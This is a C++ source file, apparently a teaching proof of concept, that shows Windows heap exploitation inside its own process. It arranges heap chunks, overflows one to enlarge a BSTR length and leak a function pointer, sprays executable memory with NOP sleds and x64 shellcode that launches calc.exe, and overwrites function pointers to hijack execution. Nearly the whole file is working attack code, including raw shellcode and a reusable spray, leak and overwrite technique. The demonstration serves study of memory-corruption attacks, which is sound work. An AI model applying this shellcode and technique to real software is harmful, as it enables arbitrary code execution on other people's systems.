#include <Windows.h>
#include <stdint.h>
#include <comdef.h>
#include <inttypes.h>
#include <stdio.h>
#include <vector>
#include <string>
#include <iostream>
using namespace std;

#define CHUNK_SIZE 0x190
#define HEAP_SPRAY_SIZE 0x10000
#define ALLOC_COUNT 10
#define HEAP_SPRAY_COUNT 48000

// Author: Carlos Dominguez
// Based on: https://medium.com/@SecWithShobhit/-3918446f8140 and https://www.rapid7.com/blog/post/2019/06/12/heap-overflow-exploitation-on-windows-10-explained/
// Compile: g++ .\spray-heap-overflow-64.cpp -o .\spray-heap-overflow-64.exe -loleaut32 -fpermissive [-g]

// some object from an app
void function1(void) {
  puts("Hola");
}

// pointer to function
typedef struct {
  void (*fp)();
} vtable_fp;

int main(int argc, char** argv) {
  int i;
  BSTR bstr;
  BSTR bstrAtHole;
  BOOL result;
  HANDLE hChunk;
  void* allocations[ALLOC_COUNT];
  void* heapSpray[HEAP_SPRAY_COUNT];
  BSTR bStrings[5];
  char overwrittingAddr[8] = {0x02, 0x02, 0x02, 0x02, 0x02, 0x02, 0x02, 0x02};
  vtable_fp someFunc;
  someFunc.fp = &function1;

  HANDLE defaultHeap = GetProcessHeap();
  if (defaultHeap == NULL) {
    printf("No process heap. Are you having a bad day?\n");
    return -1;
  }

  printf("Default heap = 0x%p\n", defaultHeap);

  // Predicable address to a NOP operation
  memcpy(overwrittingAddr + 4, (void*) &defaultHeap + 4, 4);              // With VirtualAlloc

  if (argc > 2) {
    fprintf(stderr, "Use .\\heap-overflow [Overwritting address with bytes values format or \"0x02020202\" at default]\n");
    return -1;
  }
  else if (argc == 2) {
    unsigned int value = (unsigned int)strtoul(argv[1], NULL, 0);
    if (value < 0x00000001 || value > 0xffffffff) {
      fprintf(stderr, "Error: Incorrect address, adress must be between 0x00000001 and 0xffffffff (4 bytes, only less significant)\n");
      return -1;
    }
    memcpy(overwrittingAddr, &value, 4);
  }

  // We seek to accommodate memory in a predictable configuration. To do this, we must make a maximum of 18 allocations
  // This is because the backend is more predictable than the front-end, which is activated after 18 allocations of equal size
  // In addition, we must take care with first and last allocations that may have a different address gap than the rest, which will have jumps of equal size
  printf("The following should be all in the backend allocator\n");
  for (i = 0; i < ALLOC_COUNT; i++) {
    hChunk = HeapAlloc(defaultHeap, 0, CHUNK_SIZE);
    memset(hChunk, 'A', CHUNK_SIZE);
    allocations[i] = hChunk;
    printf("[%d] Heap chunk in backend : 0x%p\n", i, hChunk);
  }

  // After this, some of the intermediate allocations are freed in order to create a hole, such as:
  // [ Chunk 1 ][ Free chunk ][ Chunk 3 ] 
  printf("Freeing allocation at index 3: 0x%p\n", allocations[3]);
  result = HeapFree(defaultHeap, HEAP_NO_SERIALIZE, allocations[3]);
  if (result == 0) {
    printf("Failed to free\n");
    return -1;
  }

  // We try to fill the hole with some kind of object with a size header you could modify (goal of attack to leak adyacent information)
  // Usually, the ideal chunks are actually objects from the application, but a recognizable object in memory is enough for this demonstration
  // Fill with several objects to incresa the chances of sucess
  for (i = 0; i < 5; i++) {
    bstr = SysAllocString(L"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA");
    bStrings[i] = bstr;
    printf("[%d] BSTR string : 0x%p\n", i, bstr);
    if((char*) allocations[3] + 8 == (char*) bstr) bstrAtHole = bstr;
    //else printf("No esta en %d\n", i);
  }

  // Now, we need to free up the next chunk after the hole to fill it with any object we want to leak (ideally, it is filled with objects from the app)
  // [ Chunk 1 ][ BSTR ][ Free Chunk ]
  printf("Freeing allocation at index 4 : 0x%p\n", allocations[4]);
  result = HeapFree(defaultHeap, HEAP_NO_SERIALIZE, allocations[4]);
  if (result == 0) {
    printf("Failed to free\n");
    return -1;
  }

  // We fill the new hole with pointers of SomeObject that we want to leak to obtain it vtable address
  // [ Chunk 1 ][ BSTR ][ Array of pointers ]
  printf("SomeFunc address : 0x%p\n", someFunc);
  printf("Allocating SomeFunc to vectors\n");
  vector<vtable_fp> array1(40, someFunc);
  vector<vtable_fp> array2(40, someFunc);
  vector<vtable_fp> array3(40, someFunc);
  vector<vtable_fp> array4(40, someFunc);
  vector<vtable_fp> array5(40, someFunc);
  vector<vtable_fp> array6(40, someFunc);
  vector<vtable_fp> array7(40, someFunc);
  vector<vtable_fp> array8(40, someFunc);
  vector<vtable_fp> array9(40, someFunc);
  vector<vtable_fp> array10(40, someFunc);

  // We see the initial size of the object placed in the first hole. This is stored in the first 4 bytes of the chunk where the BSTR is stored
  size_t strSize = SysStringByteLen(bstrAtHole);
  printf("Original String size: %d\n", (int) strSize);
  //DebugBreak();

  // First pause to analyze memory before attack
  system("PAUSE");

  // payload to open calc.exe and run an infinite loop to don't stop process and can analyse the memory
  char payload[] = "\x48\x31\xd2\x65\x48\x8b\x42\x60\x48\x8b\x70\x18\x48\x8b\x76\x20\x4c\x8b\x0e\x4d" 
                      "\x8b\x09\x4d\x8b\x49\x20\xeb\x63\x41\x8b\x49\x3c\x4d\x31\xff\x41\xb7\x88\x4d\x01" 
                      "\xcf\x49\x01\xcf\x45\x8b\x3f\x4d\x01\xcf\x41\x8b\x4f\x18\x45\x8b\x77\x20\x4d\x01" 
                      "\xce\xe3\x3f\xff\xc9\x48\x31\xf6\x41\x8b\x34\x8e\x4c\x01\xce\x48\x31\xc0\x48\x31" 
                      "\xd2\xfc\xac\x84\xc0\x74\x07\xc1\xca\x0d\x01\xc2\xeb\xf4\x44\x39\xc2\x75\xda\x45" 
                      "\x8b\x57\x24\x4d\x01\xca\x41\x0f\xb7\x0c\x4a\x45\x8b\x5f\x1c\x4d\x01\xcb\x41\x8b" 
                      "\x04\x8b\x4c\x01\xc8\xc3\xc3\x41\xb8\x98\xfe\x8a\x0e\xe8\x92\xff\xff\xff\x48\x31" 
                      "\xc9\x51\x48\xb9\x63\x61\x6c\x63\x2e\x65\x78\x65\x51\x48\x8d\x0c\x24\x48\x31\xd2" 
                      "\x48\xff\xc2\x48\x83\xec\x28\xff\xd0\xeb\xfe";

  // Create multiple allocations (heap spray) to fill enough space in memory with NOP operations followed by the above payload
  // The goal of the attack is execute arbitrary code by overwritting one function/method address which someone execute at anytime
  printf("Spraying heap with payload that open calc.exe\n");
  for(int i = 0; i < HEAP_SPRAY_COUNT; i++) {
    heapSpray[i] = VirtualAlloc(NULL, HEAP_SPRAY_SIZE, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    if(i % 16 == 0) printf("[%d] Heap spray chunk: 0x%p\n", i, heapSpray[i]);
    memset(heapSpray[i], 0x90, HEAP_SPRAY_SIZE - sizeof(payload)); 
    memcpy((char *)heapSpray[i] + HEAP_SPRAY_SIZE - sizeof(payload), payload, sizeof(payload));
  }
  //DebugBreak();

  // Second pause to analyze memory after spray and before overflow
  system("PAUSE");
  
  // Fill the previous chunk of BSTR chunk and overflow it to change the size of BSTR
  printf("Overflowing allocation 2\n");
  int allocOffset = (long long int) allocations[3] - (long long int) allocations[2] + 4;
  std::string evilString;
  evilString.append(allocOffset, 'B');
  evilString.append("\x40\x01\x00", 3);
  memcpy(allocations[2], evilString.data(), evilString.size());

  // Print new size of BSTR (not modified by a legitimate user, but by the attacker)
  // This BSTR size change allow an attacker to see information after his allocated space, 
  // so attacaker can see data from other users (dta that ideally filled the second hole)
  strSize = SysStringByteLen(bstrAtHole);
  printf("Modified String size: %d\n", (int) strSize);

  // Access to data out of space of original BSTR (attacker access to data inside the chunk with object of other users)
  std::wstring ws(bstrAtHole, SysStringLen(bstrAtHole));
  std::string s(reinterpret_cast<const char*>(ws.data()), strSize);
  std::string ref = s.substr(248+64, 8);
 
  // Use data leaked to reconstruct the address of someFunc (to probe the address that we will replace with any NOP/payload address)
  uintptr_t refAddr;
  memcpy(&refAddr, ref.data(), sizeof(refAddr)); 
  printf("SomeFunc leak: 0x%p\n", (void*)refAddr);
  //DebugBreak();

  // Overwritte some function1 pointer with predicable pointer to a NOP operation
  BYTE* pointerTopayload = reinterpret_cast<BYTE*>(bstrAtHole); 
  memcpy(pointerTopayload + 248 + 64, overwrittingAddr, 8);
  //DebugBreak();
  
  // Execute all function1 of all instances (similar to executions of other users into an app)
  // When we hit overwritten function address, calc.exe will be open and process will fall into an infinite loop
  printf("====================================\n");
  printf("Call all function1 instances:\n");
  for(int i = 0; i < array1.size(); i++) {
    printf("Array 1 [%d] (0x%p): ", i, &(array1[i]));
    array1[i].fp();
  }
  printf("====================================\n");
  for(int i = 0; i < array2.size(); i++) {
    printf("Array 2 [%d] (0x%p): ", i, &(array2[i]));
    array2[i].fp();
  }
  printf("====================================\n");
  for(int i = 0; i < array3.size(); i++) {
    printf("Array 3 [%d] (0x%p): ", i, &(array3[i]));
    array3[i].fp();
  }
  printf("====================================\n");
  for(int i = 0; i < array4.size(); i++) {
    printf("Array 4 [%d] (0x%p): ", i, &(array4[i]));
    array4[i].fp();
  }
  printf("====================================\n");
  for(int i = 0; i < array5.size(); i++) {
    printf("Array 5 [%d] (0x%p): ", i, &(array5[i]));
    array5[i].fp();
  }
  printf("====================================\n");
  for(int i = 0; i < array6.size(); i++) {
    printf("Array 6 [%d] (0x%p): ", i, &(array6[i]));
    array6[i].fp();
  }
  printf("====================================\n");
  for(int i = 0; i < array7.size(); i++) {
    printf("Array 7 [%d] (0x%p): ", i, &(array7[i]));
    array7[i].fp();
  }
  printf("====================================\n");
  for(int i = 0; i < array8.size(); i++) {
    printf("Array 8 [%d] (0x%p): ", i, &(array8[i]));
    array8[i].fp();
  }
  printf("====================================\n");
  for(int i = 0; i < array9.size(); i++) {
    printf("Array 9 [%d] (0x%p): ", i, &(array9[i]));
    array9[i].fp();
  }
  printf("====================================\n");
  for(int i = 0; i < array10.size(); i++) {
    printf("Array 10 [%d] (0x%p): ", i, &(array10[i]));
    array10[i].fp();
  }
  
  // Last pause to analyze memory after overflow (not necessary because payload execute infinite loop)
  system("PAUSE");

  for(int i = 0; i < HEAP_SPRAY_COUNT; i++) {
    VirtualFree(heapSpray[i], 0, MEM_RELEASE);
  }

  return 0;
}

